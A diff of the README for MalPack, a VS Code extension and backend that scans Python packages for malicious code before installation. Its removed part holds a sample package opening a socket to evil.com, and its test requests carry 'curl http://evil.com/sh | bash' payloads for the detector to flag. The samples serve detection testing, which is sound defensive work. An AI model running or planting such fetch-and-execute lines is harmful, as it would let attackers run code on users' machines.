@@ -1,150 +1,214 @@
-# MalPack Extension - Quick Start Guide
+# MalPack - Malicious Package Scanner
 
-## Running the Complete Workflow
+MalPack is a VS Code extension + FastAPI backend that detects malicious Python packages **before** you install them. It offers four detection approaches selectable directly from the extension UI.
 
-### 1. Start the Backend (Terminal 1)
+## Detection Methods
+
+| Method | Description | Code-Level Details |
+|--------|-------------|-------------------|
+| ⚡ **Semgrep Analysis** | Pattern-based static analysis using Semgrep YAML rules | ✅ Yes |
+| 📋 **Rule Based Analysis** | AST-based detection with 48+ hand-crafted rules across 8 security domains | ✅ Yes |
+| 🤖 **LLM Based Analysis** | Sends each `.py` file to Google Gemini AI; merges results for package verdict | ❌ Summary only |
+| 🧠 **Classifier Based** | ML classifier *(not yet implemented — coming soon)* | — |
+
+## Project Structure
+
+```
+MalPackExtension/
+├── backend/
+│   ├── app/
+│   │   ├── api/v1/endpoints/
+│   │   │   ├── scan.py                 # Rule-based + Semgrep (shared)
+│   │   │   ├── llm_check.py            # LLM/Gemini endpoint
+│   │   │   └── classifier_check.py     # Classifier stub
+│   │   ├── engine/                     # AST + regex + semgrep engines
+│   │   └── main.py                     # FastAPI app + route registration
+│   ├── test_all_endpoints.py           # Comprehensive tests (all 4 methods)
+│   ├── test_enhanced_api.py            # Legacy endpoint tests
+│   └── requirements.txt
+└── extension/
+    └── src/
+        ├── extension.ts                # Main extension logic + method routing
+        └── webviewProvider.ts          # All webview UI screens
+```
+
+## API Endpoints
+
+| Route | Method | Description |
+|-------|--------|-------------|
+| `POST /api/v1/rule_based_check/check` | Rule-Based | AST + regex scan of a single file |
+| `POST /api/v1/semgrep_check/check` | Semgrep | Semgrep scan of a single file |
+| `POST /api/v1/llm_based_check` | LLM | Batch AI analysis of all Python files |
+| `POST /api/v1/classifier_based_check` | Classifier | Stub (returns NOT_IMPLEMENTED) |
+| `POST /api/v1/scan/summary` | Aggregation | Aggregates multi-file findings into a verdict |
+
+## Setup & Installation
+
+### Backend Setup
 
 ```bash
-cd /home/swadhin/Desktop/MalPack/backend
+cd backend
+python3 -m venv venv
 source venv/bin/activate
-uvicorn app.main:app --reload
+pip install -r requirements.txt
+pip install semgrep
+uvicorn app.main:app --reload --host 0.0.0.0 --port 8000
 ```
 
-**✅ Backend Status:** Currently running on http://localhost:8000
-
-### 2. Test the Extension
-
-#### Option A: Launch Extension Development Host
-
-1. Open `/home/swadhin/Desktop/MalPack/extension` folder in VS Code
-2. Press `F5` to start Extension Development Host
-3. In the new window, run: `Ctrl+Shift+P` → `MalPack: Install Package`
-4. Enter a package name to test
-
-#### Option B: Package and Install Extension
+### Extension Setup
 
 ```bash
-cd /home/swadhin/Desktop/MalPack/extension
-npm run compile
-vsce package
-code --install-extension malpack-0.0.1.vsix
+cd extension
+npm install
 ```
 
-### 3. Test Workflow Stages
+---
 
-**Test with a simple package:**
-- Enter: `colorama` (benign package)
-- Watch the workflow:
-  - ⏳ Downloading...
-  - 🔍 Scanning...
-  - ✅ Verdict: BENIGN
-  - 📦 Install? → Files cleaned up
+## 🧪 Step-by-Step Testing Guide
 
-**Test with malicious code (create test package):**
+### A. Backend API Testing (curl / Python)
 
+**1. Start the backend:**
 ```bash
-# Create test malicious package
-cd /tmp
-mkdir evil_package
-cd evil_package
-cat > __init__.py << 'EOF'
-import os
-import socket
-
-# Malicious: Connect to external server
-s = socket.socket()
-s.connect(("evil.com", 443))
-
-# Malicious: Execute shell command
-os.system("curl http://bad.com/steal.sh | bash")
-EOF
-
-# Note: Use this with caution - only for testing!
+cd backend && source venv/bin/activate
+uvicorn app.main:app --reload --host 0.0.0.0 --port 8000
 ```
 
-### 4. Expected Workflow
-
-```
-┌─────────────────────────────────────┐
-│  STAGE 1: Verdict Panel             │
-│  ⚠️  MALICIOUS PACKAGE DETECTED      │
-│  package-name                        │
-│  Total Issues: 5                     │
-│  [Show Details] [Block Installation] │
-└─────────────────────────────────────┘
-                  ↓
-┌─────────────────────────────────────┐
-│  STAGE 2: High-Level Details        │
-│  ⚠️  Security Issues Detected        │
-│                                      │
-│  [CRITICAL] Shell command execution  │
-│  [CRITICAL] Network connection       │
-│  [WARNING] Suspicious file access    │
-│                                      │
-│  [Show in Code] [Back] [Block]       │
-└─────────────────────────────────────┘
-                  ↓
-┌─────────────────────────────────────┐
-│  STAGE 3: Code-Level View            │
-│  Editor opens with:                  │
-│  - Red boxes around malicious code   │
-│  - Hover tooltips with details       │
-│  - Problems panel with all findings  │
-└─────────────────────────────────────┘
-                  ↓
-┌─────────────────────────────────────┐
-│  STAGE 4: Final Confirmation         │
-│  ⚠️  package contains malicious code │
-│  Do you want to install it anyway?   │
-│  [Install] [Cancel]                  │
-│  → Files automatically cleaned up    │
-└─────────────────────────────────────┘
-```
-
-### 5. Verify Cleanup
-
-After any installation decision:
+**2. Quick health check:**
 ```bash
-# Check that temp files are removed
-ls /home/swadhin/Desktop/MalPack/malpack_analysis/
-# Should be empty or not exist
-```
-
-## Troubleshooting
-
-### Backend Not Running
-```bash
-# Check if backend is running
 curl http://localhost:8000/
-# Should return: {"status": "MalPack Backend Running"}
+# Expected: {"status":"MalPack Backend Running"}
 ```
 
-### Extension Not Compiling
+**3. Test rule-based endpoint (malicious sample):**
 ```bash
-cd /home/swadhin/Desktop/MalPack/extension
+curl -s -X POST http://localhost:8000/api/v1/rule_based_check/check \
+  -H "Content-Type: application/json" \
+  -d '{"file_path":"test.py","content":"import os; os.system(\"curl http://evil.com/sh | bash\")"}'
+```
+
+**4. Test semgrep endpoint:**
+```bash
+curl -s -X POST http://localhost:8000/api/v1/semgrep_check/check \
+  -H "Content-Type: application/json" \
+  -d '{"file_path":"test.py","content":"import os\nos.system(\"id\")"}'
+```
+
+**5. Test LLM endpoint (Gemini AI):**
+```bash
+curl -s -X POST http://localhost:8000/api/v1/llm_based_check \
+  -H "Content-Type: application/json" \
+  -d '{
+    "package_name": "test-pkg",
+    "files": [{"file_path": "main.py", "content": "import os\nos.system(\"curl http://evil.com | bash\")"}]
+  }'
+```
+
+**6. Test classifier stub:**
+```bash
+curl -s -X POST http://localhost:8000/api/v1/classifier_based_check \
+  -H "Content-Type: application/json" \
+  -d '{"package_name": "test-pkg", "files": []}'
+```
+
+**7. Run full test suite:**
+```bash
+python3 test_all_endpoints.py
+```
+
+---
+
+### B. VS Code Extension Testing (Local)
+
+**Prerequisites:** Backend running on port 8000, Node.js installed.
+
+**Step 1 — Build the extension:**
+```bash
+cd extension
 npm install
 npm run compile
+# Look for: "Compilation complete" with 0 errors
 ```
 
-### No Files Found
-- Make sure the package has `.py`, `.js`, or `.json` files
-- Check the extracted directory structure
+**Step 2 — Open in VS Code:**
+```bash
+code .    # from the extension/ directory
+```
 
-## What to Test
+**Step 3 — Launch Extension Development Host:**
+- Press **F5** (or Run → Start Debugging)
+- A new VS Code window opens (title bar says *Extension Development Host*)
 
-- ✅ Malicious package detection
-- ✅ Benign package pass-through
-- ✅ Navigation between stages
-- ✅ Red box decorations on code
-- ✅ Hover tooltips
-- ✅ Automatic cleanup after decision
-- ✅ Install flow (terminal opens)
-- ✅ Cancel flow (no installation)
+**Step 4 — Run the command:**
+- Press **Ctrl+Shift+P** in the *Extension Development Host* window
+- Type: `MalPack: Secure Install` → press Enter
 
-## Next Steps
+**Step 5 — Test each detection method:**
 
-Once you've verified the workflow:
-1. Test with real packages from PyPI
-2. Add more malicious patterns to detection rules
-3. Customize UI themes in webviewProvider.ts
-4. Add settings for scan sensitivity
+| Test | Expected Result |
+|------|----------------|
+| Select **LLM Based Analysis** → package: `requests` | BENIGN verdict with Gemini AI summary |
+| Select **LLM Based Analysis** → package: `colourama` (typosquat) | Likely MALICIOUS summary |
+| Select **Rule Based Analysis** → package: `requests` | BENIGN verdict |
+| Select **Semgrep Analysis** → package: `requests` | BENIGN verdict |
+| Select **Classifier Based Analysis** | "Coming Soon" screen shown; no package input requested |
+
+**Step 6 — Verify UI flow for malicious package (rule-based):**
+1. Method selector screen appears with 4 cards → Classifier is grayed out
+2. Select **Rule Based Analysis**
+3. Enter package name
+4. Progress notification appears during scan
+5. Verdict panel → shows method badge, stats, "Show Details" button
+6. Click **Show Details** → high-level issue list with severity badges
+7. Click **Show in Code** → file opens with red underlines; hover for tooltip
+8. Click **Block Installation** → temp files cleaned up
+
+**Step 7 — Verify LLM flow:**
+1. Select **LLM Based Analysis**
+2. Enter package name
+3. Progress shows "Sending N number of files to Gemini AI…"
+4. Result panel shows: method badge "🤖 Gemini AI Analysis", verdict, file count, AI-generated summary text
+5. **No "Show in Code" button** (LLM provides summary only)
+
+---
+
+## Verification
+
+```bash
+# Rule + Semgrep rules
+python3 backend/tests/verify_rules.py
+python3 backend/tests/verify_semgrep.py
+
+# All 4 endpoints
+python3 backend/test_all_endpoints.py
+```
+
+### C. Evaluating Detection Accuracy (F1 Score)
+
+MalPack includes a test suite covering 40+ AST and Semgrep rules to calculate the system's Precision, Recall, and F1 Score. Each rule has a strict "malicious" and "benign" test case to ensure no false positives.
+
+**Step 1 — Generate the Test Cases:**
+```bash
+cd backend
+source venv/bin/activate
+python3 tests/test_cases_data.py
+```
+*(This generates test files inside `backend/tests/test_cases/` for all 40+ rules)*
+
+**Step 2 — Run the F1 Evaluation Suite:**
+```bash
+python3 tests/run_eval.py
+```
+
+**Expected Output:** The script will evaluate all generated files through the AST, Regex, and Semgrep engines locally to compute True Positives (TP), False Positives (FP), True Negatives (TN), and False Negatives (FN), finally outputting the **F1 Score**.
+
+---
+
+## Detection Fallbacks & Error Handling
+
+MalPack is designed with robust fallbacks to ensure you are never left without analysis:
+
+1. **AST to Regex Fallback**: If the primary AST (Abstract Syntax Tree) parser fails to detect an obfuscated payload or cannot parse the Python file due to syntax errors, the system automatically falls back to the **Regex Engine**, scanning raw text for hardcoded IPs (`NET-003`), long hex payloads (`EVASION-006`), and base64 blobs.
+2. **LLM API Quota Fallback**: If the Gemini API limit is exhausted (e.g., `429 RESOURCE_EXHAUSTED`), the analysis does not silently fail as "Safe". Instead, it intercepts the error and returns a distinct **API_ERROR** verdict in the VS Code UI, giving explicit instructions on how to wait for the quota reset or change the API key.
+3. **PyPI 404 Fallback**: If a package name is misspelled or does not exist on PyPI, the system cleanly catches the 404 error before the extraction phase and stops the scan with a friendly "Package not found on PyPI" message.
+4. **Semgrep Missing Rules**: If Semgrep YAML rules are unavailable or the binary fails, MalPack relies entirely on the built-in pure Python AST engine, guaranteeing that Rule-Based scanning always functions.
